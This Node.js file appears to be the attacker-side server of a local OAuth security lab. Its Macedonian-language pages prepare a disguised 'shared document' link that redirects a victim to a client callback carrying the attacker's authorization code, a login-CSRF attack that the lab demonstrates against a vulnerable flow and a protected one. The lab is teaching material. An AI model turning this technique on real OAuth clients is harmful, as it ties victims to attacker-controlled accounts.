const http = require('http');

const PORT = 7000;

function escapeHtml(value = '') {
  return String(value)
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&#039;');
}

function validTarget(value) {
  try {
    const target = new URL(value);
    return target.origin === 'http://localhost:8000'
      && ['/callback', '/secure-callback'].includes(target.pathname)
      && target.searchParams.has('code');
  } catch {
    return false;
  }
}

function page(content) {
  return `<!doctype html>
<html lang="mk">
<head>
  <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Attacker Lab Site</title>
  <style>
    body{font:16px/1.55 system-ui,sans-serif;max-width:760px;margin:48px auto;padding:0 20px;color:#2b1620;background:#fff3f6}
    main{background:white;padding:28px;border-radius:14px;box-shadow:0 8px 30px #6d183318}h1{margin-top:0}
    code{background:#f5e9ed;padding:2px 5px;border-radius:4px;overflow-wrap:anywhere}.button{display:inline-block;border-radius:8px;padding:11px 16px;margin:6px 8px 6px 0;background:#9f1239;color:white;text-decoration:none;font-weight:650}.secondary{background:#596579}.box{padding:13px;background:#fff0c9;border-left:4px solid #d89b00}
  </style>
</head><body><main>${content}</main></body></html>`;
}

function send(res, status, content) {
  const body = page(content);
  res.writeHead(status, { 'content-type': 'text/html; charset=utf-8', 'content-length': Buffer.byteLength(body) });
  res.end(body);
}

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);

  if (url.pathname === '/') {
    const target = url.searchParams.get('target') || '';
    if (!target) {
      return send(res, 200, `
        <h1>Страница на напаѓачот</h1>
        <p>Оваа страница е под контрола на напаѓачот и се користи само во локалната лабораторија.</p>
        <ol><li>Започни OAuth најава.</li><li>Кај LabID избери ја сметката на напаѓачот.</li><li>Authorization Server ќе го прикаже пресретнатиот callback.</li></ol>
        <a class="button" href="http://localhost:8000/login?capture=1">Подготви напад врз ранливиот flow</a>
        <a class="button secondary" href="http://localhost:8000/secure-login?capture=1">Обиди се врз заштитениот flow</a>`);
    }

    if (!validTarget(target)) return send(res, 400, '<h1>Невалидна callback-врска</h1>');
    const delivery = `/deliver?target=${encodeURIComponent(target)}`;
    return send(res, 200, `
      <h1>Exploit-врската е подготвена</h1>
      <p>Испрати ја следнава врска до жртвата или отвори ја во приватен/incognito прозорец:</p>
      <p><code>http://127.0.0.1:${PORT}${escapeHtml(delivery)}</code></p>
      <a class="button" href="${escapeHtml(delivery)}">Отвори „споделен документ“</a>
      <p class="box">За правилна симулација, оваа врска треба да се отвори во друг профил или incognito прозорец, кој ја претставува жртвата.</p>`);
  }

  if (url.pathname === '/deliver') {
    const target = url.searchParams.get('target') || '';
    if (!validTarget(target)) return send(res, 400, '<h1>Невалидна цел</h1>');
    res.writeHead(302, { location: target, 'cache-control': 'no-store' });
    return res.end();
  }

  send(res, 404, '<h1>404</h1>');
});

server.listen(PORT, '0.0.0.0', () => console.log(`Attacker lab site listening on ${PORT}`));
